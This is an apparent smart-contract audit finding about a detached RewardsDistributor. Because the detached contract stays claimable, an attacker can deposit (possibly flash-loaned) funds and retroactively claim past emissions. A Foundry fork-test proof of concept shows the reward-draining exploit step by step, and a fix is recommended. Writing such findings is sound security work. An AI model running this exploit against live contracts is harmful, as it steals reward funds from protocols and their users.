### Title
Detached `RewardsDistributor` can retroactively mint reward claims after unrecorded deposits - (File: `contracts/RewardsDistributor.sol`)

### Summary
`DepositToken` and `DebtToken` only notify the distributors currently returned by `Pool.getRewardsDistributors()` before changing balances. [1](#0-0) [2](#0-1)  A detached `RewardsDistributor` still retains its `tokenSpeeds`, `tokenStates`, reward-token balance, and permissionless `updateBeforeMintOrBurn()` and `claimRewards()` functions. [3](#0-2)  Consequently, an unprivileged user can deposit after the distributor has been detached and then manually call the stale distributor, causing it to calculate rewards using the newly inflated balance over the entire elapsed index interval. [4](#0-3) 

### Finding Description
`DepositToken._mint()`, `_burn()`, and `_transfer()` invoke `updateRewardsBeforeMintOrBurn` or `updateRewardsBeforeTransfer`, but both modifiers iterate only over `pool.getRewardsDistributors()`. [1](#0-0) [5](#0-4)  After a distributor is removed from that list, deposits, withdrawals, and transfers no longer synchronize the detached distributor's `accountIndexOf` state.

The detached distributor does not require registration when accruing or claiming rewards: `onlyIfDistributorExists` is used only by speed updates, not by `updateBeforeMintOrBurn()`, `updateBeforeTransfer()`, or `claimRewards()`. [6](#0-5) [7](#0-6) 

`_calculateTokenIndex()` advances the token index using `block.timestamp - tokenStates[token].timestamp` and the current `totalSupply()`, while `_calculateTokenDelta()` multiplies that historical index delta by the account's **current** balance. [4](#0-3)  Therefore, if the attacker deposits immediately before calling the stale update function, the detached distributor treats the attacker as having held that balance since the distributor's last index update.

### Impact Explanation
This breaks the reward-accrual invariant: emissions for a past interval must be distributed according to balances held during that interval, but the stale distributor instead distributes them according to balances present at the later manual update. [8](#0-7) 

An attacker can use borrowed underlying collateral, call `DepositToken.deposit()`, manually update the detached distributor, and call `claimRewards()` to receive reward tokens for a period during which the attacker held no deposit tokens. [9](#0-8) [10](#0-9)  The attacker can then withdraw the collateral through `DepositToken.withdraw()` and repay the borrowed funds, retaining the stolen rewards. [11](#0-10) 

The same issue can be repeated on subsequent timestamps because `accountIndexOf` remains at the stale checkpoint while new unrecorded balance changes occur. [12](#0-11)  If the detached contract still holds reward tokens, those unclaimed emissions can be drained up to `rewardToken.balanceOf(address(this))`; `_transferRewardIfEnoughTokens()` caps each payout only at the distributor's current balance. [13](#0-12) 

### Likelihood Explanation
The exploit requires the ordinary administrative condition described by this bug class: an old distributor has been detached while retaining positive `tokenSpeeds[token]` and a reward-token balance. [14](#0-13)  Once that condition exists, no privileged attacker capability is needed because `updateBeforeMintOrBurn()` is intentionally callable by anyone and `claimRewards()` has no sender restriction tying the caller to `account_`. [15](#0-14) 

The path is not blocked by `nonReentrant`, pause checks, distributor-registration checks, token-existence checks, or accounting of the account's balance at the previous checkpoint. [3](#0-2)  A flash-loaned deposit increases the impact because the historical index delta is applied to the temporary post-deposit balance rather than to a balance that existed during the elapsed interval. [16](#0-15) 

### Recommendation
Do not leave a reward-bearing distributor detached while it remains claimable. Before removing a distributor from `Pool.getRewardsDistributors()`, finalize every tracked token's index, settle or disable claims appropriately, set all speeds to zero, and withdraw remaining reward tokens to the intended successor or treasury. [13](#0-12) [17](#0-16) 

Additionally, restrict `updateBeforeMintOrBurn()` and `updateBeforeTransfer()` so they can only be called by a registered `DepositToken` or `DebtToken` while `address(this)` remains registered on the pool, or add an explicit `onlyIfDistributorExists` guard to accrual and claim paths. [6](#0-5) [18](#0-17)  For migration, preserving the registered distributor address and upgrading/migrating its internal logic avoids the loss of balance-change notifications entirely. [1](#0-0) 

### Proof of Concept
The following Foundry fork test recreates the post-detachment state and demonstrates the accounting error. The governor call only establishes the already-reported detached-distributor condition; the profitable calls are made by an unprivileged attacker.

```solidity
// test/foundry/DetachedRewardsDistributor.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "../../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";
import {RewardsDistributor} from "../../contracts/RewardsDistributor.sol";
import {IDepositToken} from "../../contracts/interfaces/IDepositToken.sol";
import {IPool} from "../../contracts/interfaces/IPool.sol";

contract DetachedRewardsDistributorTest is Test {
    IPool pool = IPool(vm.envAddress("POOL"));
    RewardsDistributor oldDist =
        RewardsDistributor(vm.envAddress("OLD_REWARDS_DISTRIBUTOR"));
    IDepositToken msd = IDepositToken(vm.envAddress("DEPOSIT_TOKEN"));
    address governor = vm.envAddress("GOVERNOR");

    function testDetachedDistributorRetroactiveClaim() public {
        IERC20 underlying = msd.underlying();
        IERC20 reward = oldDist.rewardToken();
        address attacker = makeAddr("attacker");

        assertGt(oldDist.tokenSpeeds(IERC20(address(msd))), 0);
        assertGt(reward.balanceOf(address(oldDist)), 0);

        // Establishes the detached state from the reported bug class.
        vm.prank(governor);
        pool.removeRewardsDistributor(address(oldDist));

        (, uint32 lastTimestamp) = oldDist.tokenStates(IERC20(address(msd)));
        vm.warp(uint256(lastTimestamp) + 1 days);

        // A production proof can substitute a flash-loan callback for deal().
        uint256 depositAmount = msd.totalSupply() * 10;
        deal(address(underlying), attacker, depositAmount);

        vm.startPrank(attacker);
        underlying.approve(address(msd), depositAmount);
        msd.deposit(depositAmount, attacker);

        uint256 inflatedBalance = msd.balanceOf(attacker);
        uint256 claimable =
            oldDist.claimable(attacker);

        assertGt(claimable, 0);

        uint256 rewardBefore = reward.balanceOf(attacker);
        oldDist.claimRewards(attacker);
        uint256 stolen = reward.balanceOf(attacker) - rewardBefore;

        assertGt(stolen, 0);
        assertApproxEqRel(stolen, claimable, 0.01e18);

        // The deposit used to capture historical emissions can be exited.
        msd.withdraw(inflatedBalance, attacker);
        vm.stopPrank();
    }
}
```

The critical observation is that `claimable(attacker)` is nonzero immediately after `msd.deposit()` even though the attacker held zero `msd` for the entire `1 days` elapsed interval; `_calculateTokenDelta()` uses the post-deposit `inflatedBalance` against the stale index delta. [8](#0-7)

    function _calculateTokenIndex(
        TokenState memory _supplyState,
        IERC20 token_
    ) private view returns (uint224 _newIndex, uint32 _newTimestamp) {
        uint256 _speed = tokenSpeeds[token_];
        uint256 _deltaTimestamps = block.timestamp - uint256(_supplyState.timestamp);
        if (_deltaTimestamps > 0 && _speed > 0) {
            uint256 _totalSupply = token_.totalSupply();
            uint256 _tokensAccrued = _deltaTimestamps * _speed;
            uint256 _ratio = _totalSupply > 0 ? _tokensAccrued.wadDiv(_totalSupply) : 0;
            _newIndex = (_supplyState.index + _ratio).toUint224();
            _newTimestamp = block.timestamp.toUint32();
        } else if (_deltaTimestamps > 0 && _supplyState.index > 0) {
            _newTimestamp = block.timestamp.toUint32();
        }
    }
